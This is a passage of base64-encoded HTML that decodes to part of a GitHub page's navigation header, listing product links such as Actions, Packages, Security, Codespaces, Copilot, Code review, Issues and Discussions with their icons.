AgZmxleC1qdXN0aWZ5LWJldHdlZW4gZmxleC1pdGVtcy1jZW50ZXIgZC1ibG9jayBkLWxnLWZsZXggZmxleC1sZy1ub3dyYXAgZmxleC1sZy1pdGVtcy1jZW50ZXIganMtZGV0YWlscy1jb250YWluZXIganMtaGVhZGVyLW1lbnUtaXRlbSI+CiAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iSGVhZGVyTWVudS1saW5rIGJvcmRlci0wIHdpZHRoLWZ1bGwgd2lkdGgtbGctYXV0byBweC0wIHB4LWxnLTIgcHktMyBweS1sZy0yIG5vLXdyYXAgZC1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIGZsZXgtanVzdGlmeS1iZXR3ZWVuIGpzLWRldGFpbHMtdGFyZ2V0IiBhcmlhLWV4cGFuZGVkPSJmYWxzZSI+CiAgICAgICAgUHJvZHVjdAogICAgICAgIDxzdmcgb3BhY2l0eT0iMC41IiBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1jaGV2cm9uLWRvd24gSGVhZGVyTWVudS1pY29uIG1sLTEiPgogICAgPHBhdGggZD0iTTEyLjc4IDUuMjJhLjc0OS43NDkgMCAwIDEgMCAxLjA2bC00LjI1IDQuMjVhLjc0OS43NDkgMCAwIDEtMS4wNiAwTDMuMjIgNi4yOGEuNzQ5Ljc0OSAwIDEgMSAxLjA2LTEuMDZMOCA4LjkzOWwzLjcyLTMuNzE5YS43NDkuNzQ5IDAgMCAxIDEuMDYgMFoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDwvYnV0dG9uPgogICAgICA8ZGl2IGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duIGRyb3Bkb3duLW1lbnUgcm91bmRlZCBtLTAgcC0wIHB5LTIgcHktbGctNCBwb3NpdGlvbi1yZWxhdGl2ZSBwb3NpdGlvbi1sZy1hYnNvbHV0ZSBsZWZ0LTAgbGVmdC1sZy1uMyBkLWxnLWZsZXggZHJvcGRvd24tbWVudS13aWRlIj4KICAgICAgICAgIDxkaXYgY2xhc3M9InB4LWxnLTQgYm9yZGVyLWxnLXJpZ2h0IG1iLTQgbWItbGctMCBwci1sZy03Ij4KICAgICAgICAgICAgPHVsIGNsYXNzPSJsaXN0LXN0eWxlLW5vbmUgZjUiID4KICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSBkLWZsZXggZmxleC1pdGVtcy1jZW50ZXIgcGItbGctMyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBQcm9kdWN0JnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBBY3Rpb25zJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6QWN0aW9uczsmcXVvdDt9IiBocmVmPSIvZmVhdHVyZXMvYWN0aW9ucyI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24td29ya2Zsb3cgY29sb3ItZmctc3VidGxlIG1yLTMiPgogICAgPHBhdGggZD0iTTEgM2EyIDIgMCAwIDEgMi0yaDYuNWEyIDIgMCAwIDEgMiAydjYuNWEyIDIgMCAwIDEtMiAySDd2NC4wNjNDNyAxNi4zNTUgNy42NDQgMTcgOC40MzggMTdIMTIuNXYtMi41YTIgMiAwIDAgMSAyLTJIMjFhMiAyIDAgMCAxIDIgMlYyMWEyIDIgMCAwIDEtMiAyaC02LjVhMiAyIDAgMCAxLTItMnYtMi41SDguNDM3QTIuOTM5IDIuOTM5IDAgMCAxIDUuNSAxNS41NjJWMTEuNUgzYTIgMiAwIDAgMS0yLTJabTItLjVhLjUuNSAwIDAgMC0uNS41djYuNWEuNS41IDAgMCAwIC41LjVoNi41YS41LjUgMCAwIDAgLjUtLjVWM2EuNS41IDAgMCAwLS41LS41Wk0xNC41IDE0YS41LjUgMCAwIDAtLjUuNVYyMWEuNS41IDAgMCAwIC41LjVIMjFhLjUuNSAwIDAgMCAuNS0uNXYtNi41YS41LjUgMCAwIDAtLjUtLjVaIj48L3BhdGg+Cjwvc3ZnPgogICAgICA8ZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbG9yLWZnLWRlZmF1bHQgaDQiPkFjdGlvbnM8L2Rpdj4KICAgICAgICBBdXRvbWF0ZSBhbnkgd29ya2Zsb3cKICAgICAgPC9kaXY+CgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSBkLWZsZXggZmxleC1pdGVtcy1jZW50ZXIgcGItbGctMyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBQcm9kdWN0JnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBQYWNrYWdlcyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOlBhY2thZ2VzOyZxdW90O30iIGhyZWY9Ii9mZWF0dXJlcy9wYWNrYWdlcyI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tcGFja2FnZSBjb2xvci1mZy1zdWJ0bGUgbXItMyI+CiAgICA8cGF0aCBkPSJNMTIuODc2LjY0Vi42MzlsOC4yNSA0Ljc2M2MuNTQxLjMxMy44NzUuODkuODc1IDEuNTE1djkuNTI1YTEuNzUgMS43NSAwIDAgMS0uODc1IDEuNTE2bC04LjI1IDQuNzYyYTEuNzQ4IDEuNzQ4IDAgMCAxLTEuNzUgMGwtOC4yNS00Ljc2M2ExLjc1IDEuNzUgMCAwIDEtLjg3NS0xLjUxNVY2LjkxN2MwLS42MjUuMzM0LTEuMjAyLjg3NS0xLjUxNUwxMS4xMjYuNjRhMS43NDggMS43NDggMCAwIDEgMS43NSAwWm0tMSAxLjI5OEw0LjI1MSA2LjM0bDcuNzUgNC40NzQgNy43NS00LjQ3NC03LjYyNS00LjQwMmEuMjQ4LjI0OCAwIDAgMC0uMjUgMFptLjg3NSAxOS4xMjMgNy42MjUtNC40MDJhLjI1LjI1IDAgMCAwIC4xMjUtLjIxNlY3LjYzOWwtNy43NSA0LjQ3NFpNMy41MDEgNy42NHY4LjgwM2MwIC4wOS4wNDguMTcyLjEyNS4yMTZsNy42MjUgNC40MDJ2LTguOTQ3WiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgPGRpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2xvci1mZy1kZWZhdWx0IGg0Ij5QYWNrYWdlczwvZGl2PgogICAgICAgIEhvc3QgYW5kIG1hbmFnZSBwYWNrYWdlcwogICAgICA8L2Rpdj4KCiAgICAKPC9hPjwvbGk+CgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciBwYi1sZy0zIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFByb2R1Y3QmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIFNlY3VyaXR5JnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6U2VjdXJpdHk7JnF1b3Q7fSIgaHJlZj0iL2ZlYXR1cmVzL3NlY3VyaXR5Ij4KICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIyNCIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1zaGllbGQtY2hlY2sgY29sb3ItZmctc3VidGxlIG1yLTMiPgogICAgPHBhdGggZD0iTTE2LjUzIDkuNzhhLjc1Ljc1IDAgMCAwLTEuMDYtMS4wNkwxMSAxMy4xOWwtMS45Ny0xLjk3YS43NS43NSAwIDAgMC0xLjA2IDEuMDZsMi41IDIuNWEuNzUuNzUgMCAwIDAgMS4wNiAwbDUtNVoiPjwvcGF0aD48cGF0aCBkPSJtMTIuNTQuNjM3IDguMjUgMi42NzVBMS43NSAxLjc1IDAgMCAxIDIyIDQuOTc2VjEwYzAgNi4xOS0zLjc3MSAxMC43MDQtOS40MDEgMTIuODNhMS43MDQgMS43MDQgMCAwIDEtMS4xOTggMEM1Ljc3IDIwLjcwNSAyIDE2LjE5IDIgMTBWNC45NzZjMC0uNzU4LjQ4OS0xLjQzIDEuMjEtMS42NjRMMTEuNDYuNjM3YTEuNzQ4IDEuNzQ4IDAgMCAxIDEuMDggMFptLS42MTcgMS40MjYtOC4yNSAyLjY3NmEuMjQ5LjI0OSAwIDAgMC0uMTczLjIzN1YxMGMwIDUuNDYgMy4yOCA5LjQ4MyA4LjQzIDExLjQyNmEuMTk5LjE5OSAwIDAgMCAuMTQgMEMxNy4yMiAxOS40ODMgMjAuNSAxNS40NjEgMjAuNSAxMFY0Ljk3NmEuMjUuMjUgMCAwIDAtLjE3My0uMjM3bC04LjI1LTIuNjc2YS4yNTMuMjUzIDAgMCAwLS4xNTQgMFoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxkaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCBoNCI+U2VjdXJpdHk8L2Rpdj4KICAgICAgICBGaW5kIGFuZCBmaXggdnVsbmVyYWJpbGl0aWVzCiAgICAgIDwvZGl2PgoKICAgIAo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkgZC1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIHBiLWxnLTMiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgUHJvZHVjdCZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gQ29kZXNwYWNlcyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkNvZGVzcGFjZXM7JnF1b3Q7fSIgaHJlZj0iL2ZlYXR1cmVzL2NvZGVzcGFjZXMiPgogICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHZlcnNpb249IjEuMSIgd2lkdGg9IjI0IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWNvZGVzcGFjZXMgY29sb3ItZmctc3VidGxlIG1yLTMiPgogICAgPHBhdGggZD0iTTMuNSAzLjc1QzMuNSAyLjc4NCA0LjI4NCAyIDUuMjUgMmgxMy41Yy45NjYgMCAxLjc1Ljc4NCAxLjc1IDEuNzV2Ny41QTEuNzUgMS43NSAwIDAgMSAxOC43NSAxM0g1LjI1YTEuNzUgMS43NSAwIDAgMS0xLjc1LTEuNzVabS0yIDEyYzAtLjk2Ni43ODQtMS43NSAxLjc1LTEuNzVoMTcuNWMuOTY2IDAgMS43NS43ODQgMS43NSAxLjc1djRhMS43NSAxLjc1IDAgMCAxLTEuNzUgMS43NUgzLjI1YTEuNzUgMS43NSAwIDAgMS0xLjc1LTEuNzVaTTUuMjUgMy41YS4yNS4yNSAwIDAgMC0uMjUuMjV2Ny41YzAgLjEzOC4xMTIuMjUuMjUuMjVoMTMuNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtNy41YS4yNS4yNSAwIDAgMC0uMjUtLjI1Wm0tMiAxMmEuMjUuMjUgMCAwIDAtLjI1LjI1djRjMCAuMTM4LjExMi4yNS4yNS4yNWgxNy41YS4yNS4yNSAwIDAgMCAuMjUtLjI1di00YS4yNS4yNSAwIDAgMC0uMjUtLjI1WiI+PC9wYXRoPjxwYXRoIGQ9Ik0xMCAxNy43NWEuNzUuNzUgMCAwIDEgLjc1LS43NWg2LjVhLjc1Ljc1IDAgMCAxIDAgMS41aC02LjVhLjc1Ljc1IDAgMCAxLS43NS0uNzVabS00IDBhLjc1Ljc1IDAgMCAxIC43NS0uNzVoLjVhLjc1Ljc1IDAgMCAxIDAgMS41aC0uNWEuNzUuNzUgMCAwIDEtLjc1LS43NVoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxkaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCBoNCI+Q29kZXNwYWNlczwvZGl2PgogICAgICAgIEluc3RhbnQgZGV2IGVudmlyb25tZW50cwogICAgICA8L2Rpdj4KCiAgICAKPC9hPjwvbGk+CgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciBwYi1sZy0zIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFByb2R1Y3QmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIENvcGlsb3QmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpDb3BpbG90OyZxdW90O30iIGhyZWY9Ii9mZWF0dXJlcy9jb3BpbG90Ij4KICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIyNCIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1jb3BpbG90IGNvbG9yLWZnLXN1YnRsZSBtci0zIj4KICAgIDxwYXRoIGQ9Ik0yMy45MjIgMTYuOTkyYy0uODYxIDEuNDk1LTUuODU5IDUuMDIzLTExLjkyMiA1LjAyMy02LjA2MyAwLTExLjA2MS0zLjUyOC0xMS45MjItNS4wMjNBLjY0MS42NDEgMCAwIDEgMCAxNi43MzZ2LTIuODY5YS44NDEuODQxIDAgMCAxIC4wNTMtLjIyYy4zNzItLjkzNSAxLjM0Ny0yLjI5MiAyLjYwNS0yLjY1Ni4xNjctLjQyOS40MTQtMS4wNTUuNjQ0LTEuNTE3YTEwLjE5NSAxMC4xOTUgMCAwIDEtLjA1Mi0xLjA4NmMwLTEuMzMxLjI4Mi0yLjQ5OSAxLjEzMi0zLjM2OC4zOTctLjQwNi44OS0uNzE3IDEuNDc0LS45NTIgMS4zOTktMS4xMzYgMy4zOTItMi4wOTMgNi4xMjItMi4wOTMgMi43MzEgMCA0Ljc2Ny45NTcgNi4xNjYgMi4wOTMuNTg0LjIzNSAxLjA3Ny41NDYgMS40NzQuOTUyLjg1Ljg2OSAxLjEzMiAyLjAzNyAxLjEzMiAzLjM2OCAwIC4zNjgtLjAxNC43MzMtLjA1MiAxLjA4Ni4yMy40NjIuNDc3IDEuMDg4LjY0NCAxLjUxNyAxLjI1OC4zNjQgMi4yMzMgMS43MjEgMi42MDUgMi42NTZhLjgzMi44MzIgMCAwIDEgLjA1My4yMnYyLjg2OWEuNjQxLjY0MSAwIDAgMS0uMDc4LjI1NlpNMTIuMTcyIDExaC0uMzQ0YTQuMzIzIDQuMzIzIDAgMCAxLS4zNTUuNTA4QzEwLjcwMyAxMi40NTUgOS41NTUgMTMgNy45NjUgMTNjLTEuNzI1IDAtMi45ODktLjM1OS0zLjc4Mi0xLjI1OWEyLjAwNSAyLjAwNSAwIDAgMS0uMDg1LS4xMDRMNCAxMS43NDF2Ni41ODVjMS40MzUuNzc5IDQuNTE0IDIuMTc5IDggMi4xNzkgMy40ODYgMCA2LjU2NS0xLjQgOC0yLjE3OXYtNi41ODVsLS4wOTgtLjEwNHMtLjAzMy4wNDUtLjA4NS4xMDRjLS43OTMuOS0yLjA1NyAxLjI1OS0zLjc4MiAxLjI1OS0xLjU5IDAtMi43MzgtLjU0NS0zLjUwOC0xLjQ5MmE0LjMyMyA0LjMyMyAwIDAgMS0uMzU1LS41MDhoLS4wMTYuMDE2Wm0uNjQxLTIuOTM1Yy4xMzYgMS4wNTcuNDAzIDEuOTEzLjg3OCAyLjQ5Ny40NDIuNTQ0IDEuMTM0LjkzOCAyLjM0NC45MzggMS41NzMgMCAyLjI5Mi0uMzM3IDIuNjU3LS43NTEuMzg0LS40MzUuNTU4LTEuMTUuNTU4LTIuMzYxIDAtMS4xNC0uMjQzLTEuODQ3LS43MDUtMi4zMTktLjQ3Ny0uNDg4LTEuMzE5LS44NjItMi44MjQtMS4wMjUtMS40ODctLjE2MS0yLjE5Mi4xMzgtMi41MzMuNTI5LS4yNjkuMzA3LS40MzcuODA4LS40MzggMS41Nzh2LjAyMWMwIC4yNjUuMDIxLjU2Mi4wNjMuODkzWm0tMS42MjYgMGMuMDQyLS4zMzEuMDYzLS42MjguMDYzLS44OTR2LS4wMmMtLjAwMS0uNzctLjE2OS0xLjI3MS0uNDM4LTEuNTc4LS4zNDEtLjM5MS0xLjA0Ni0uNjktMi41MzMtLjUyOS0xLjUwNS4xNjMtMi4zNDcuNTM3LTIuODI0IDEuMDI1LS40NjIuNDcyLS43MDUgMS4xNzktLjcwNSAyLjMxOSAwIDEuMjExLjE3NSAxLjkyNi41NTggMi4zNjEuMzY1LjQxNCAxLjA4NC43NTEgMi42NTcuNzUxIDEuMjEgMCAxLjkwMi0uMzk0IDIuMzQ0LS45MzguNDc1LS41ODQuNzQyLTEuNDQuODc4LTIuNDk3WiI+PC9wYXRoPjxwYXRoIGQ9Ik0xNC41IDE0LjI1YTEgMSAwIDAgMSAxIDF2MmExIDEgMCAwIDEtMiAwdi0yYTEgMSAwIDAgMSAxLTFabS01IDBhMSAxIDAgMCAxIDEgMXYyYTEgMSAwIDAgMS0yIDB2LTJhMSAxIDAgMCAxIDEtMVoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxkaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCBoNCI+Q29waWxvdDwvZGl2PgogICAgICAgIFdyaXRlIGJldHRlciBjb2RlIHdpdGggQUkKICAgICAgPC9kaXY+CgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSBkLWZsZXggZmxleC1pdGVtcy1jZW50ZXIgcGItbGctMyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBQcm9kdWN0JnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBDb2RlIHJldmlldyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkNvZGUgcmV2aWV3OyZxdW90O30iIGhyZWY9Ii9mZWF0dXJlcy9jb2RlLXJldmlldyI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tY29kZS1yZXZpZXcgY29sb3ItZmctc3VidGxlIG1yLTMiPgogICAgPHBhdGggZD0iTTEwLjMgNi43NGEuNzUuNzUgMCAwIDEtLjA0IDEuMDZsLTIuOTA4IDIuNyAyLjkwOCAyLjdhLjc1Ljc1IDAgMSAxLTEuMDIgMS4xbC0zLjUtMy4yNWEuNzUuNzUgMCAwIDEgMC0xLjFsMy41LTMuMjVhLjc1Ljc1IDAgMCAxIDEuMDYuMDRabTMuNDQgMS4wNmEuNzUuNzUgMCAxIDEgMS4wMi0xLjFsMy41IDMuMjVhLjc1Ljc1IDAgMCAxIDAgMS4xbC0zLjUgMy4yNWEuNzUuNzUgMCAxIDEtMS4wMi0xLjFsMi45MDgtMi43LTIuOTA4LTIuN1oiPjwvcGF0aD48cGF0aCBkPSJNMS41IDQuMjVjMC0uOTY2Ljc4NC0xLjc1IDEuNzUtMS43NWgxNy41Yy45NjYgMCAxLjc1Ljc4NCAxLjc1IDEuNzV2MTIuNWExLjc1IDEuNzUgMCAwIDEtMS43NSAxLjc1aC05LjY5bC0zLjU3MyAzLjU3M0ExLjQ1OCAxLjQ1OCAwIDAgMSA1IDIxLjA0M1YxOC41SDMuMjVhMS43NSAxLjc1IDAgMCAxLTEuNzUtMS43NVpNMy4yNSA0YS4yNS4yNSAwIDAgMC0uMjUuMjV2MTIuNWMwIC4xMzguMTEyLjI1LjI1LjI1aDIuNWEuNzUuNzUgMCAwIDEgLjc1Ljc1djMuMTlsMy43Mi0zLjcyYS43NDkuNzQ5IDAgMCAxIC41My0uMjJoMTBhLjI1LjI1IDAgMCAwIC4yNS0uMjVWNC4yNWEuMjUuMjUgMCAwIDAtLjI1LS4yNVoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxkaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCBoNCI+Q29kZSByZXZpZXc8L2Rpdj4KICAgICAgICBNYW5hZ2UgY29kZSBjaGFuZ2VzCiAgICAgIDwvZGl2PgoKICAgIAo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkgZC1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIHBiLWxnLTMiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgUHJvZHVjdCZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gSXNzdWVzJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6SXNzdWVzOyZxdW90O30iIGhyZWY9Ii9mZWF0dXJlcy9pc3N1ZXMiPgogICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHZlcnNpb249IjEuMSIgd2lkdGg9IjI0IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWlzc3VlLW9wZW5lZCBjb2xvci1mZy1zdWJ0bGUgbXItMyI+CiAgICA8cGF0aCBkPSJNMTIgMWM2LjA3NSAwIDExIDQuOTI1IDExIDExcy00LjkyNSAxMS0xMSAxMVMxIDE4LjA3NSAxIDEyIDUuOTI1IDEgMTIgMVpNMi41IDEyYTkuNSA5LjUgMCAwIDAgOS41IDkuNSA5LjUgOS41IDAgMCAwIDkuNS05LjVBOS41IDkuNSAwIDAgMCAxMiAyLjUgOS41IDkuNSAwIDAgMCAyLjUgMTJabTkuNSAyYTIgMiAwIDEgMS0uMDAxLTMuOTk5QTIgMiAwIDAgMSAxMiAxNFoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxkaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCBoNCI+SXNzdWVzPC9kaXY+CiAgICAgICAgUGxhbiBhbmQgdHJhY2sgd29yawogICAgICA8L2Rpdj4KCiAgICAKPC9hPjwvbGk+CgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBQcm9kdWN0JnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBEaXNjdXNzaW9ucyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkRpc2N1c3Npb25zOyZxdW90O30iIGhyZWY9Ii9mZWF0dXJlcy9kaXNjdXNzaW9ucyI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tY29tbWVudC1kaXNjdXNzaW9uIGNvbG9yLWZnLXN1YnRsZSBtci0zIj4KICAgIDxwYXRoIGQ9Ik0xLjc1IDFoMTIuNWMuOTY2IDAgMS43NS43ODQgMS43NSAxLjc1djkuNUExLjc1IDEuNzUgMCAwIDEgMTQuMjUgMTRIOC4wNjFsLTIuNTc0IDIuNTczQTEuNDU4IDEuNDU4IDAgMCAxIDMgMTUuNTQzVjE0SDEuNzVBMS43NSAxLjc1IDAgMCAxIDAgMTIuMjV2LTkuNUMwIDEuNzg0Ljc4NCAxIDEuNzUgMVpNMS41IDIuNzV2OS41YzAgLjEzOC4xMTIuMjUuMjUuMjVoMmEuNzUuNzUgMCAwIDEgLjc1Ljc1djIuMTlsMi43Mi0yLjcyYS43NDkuNzQ5IDAgMCAxIC41My0uMjJoNi41YS4yNS4yNSAwIDAgMCAuMjUtLjI1di05LjVhLjI1LjI1IDAgMCAwLS4yNS0uMjVIMS43NWEuMjUuMjUgMCAwIDAtLjI1LjI1WiI+PC9wYXRoPjxwYXRoIGQ9Ik0yMi41IDguNzVhLjI1LjI1IDAgMCAwLS4yNS0uMjVoLTMuNWEuNzUuNzUgMCAwIDEgMC0xLjVoMy41Yy45NjYgMCAxLjc1Ljc4NCAxLjc1IDEuNzV2OS41QTEuNzUgMS43NSAwIDAgMSAyMi4yNSAyMEgyMXYxLjU0M2ExLjQ1NyAxLjQ1NyAwIDAgMS0yLjQ4NyAxLjAzTDE1LjkzOSAyMEgxMC43NUExLjc1IDEuNzUgMCAwIDEgOSAxOC4yNXYtMS40NjVhLjc1Ljc1IDAgMCAxIDEuNSAwdjEuNDY1YzAgLjEzOC4xMTIuMjUuMjUuMjVoNS41YS43NS43NSAwIDAgMSAuNTMuMjJsMi43MiAyLjcydi0yLjE5YS43NS43NSAwIDAgMSAuNzUtLjc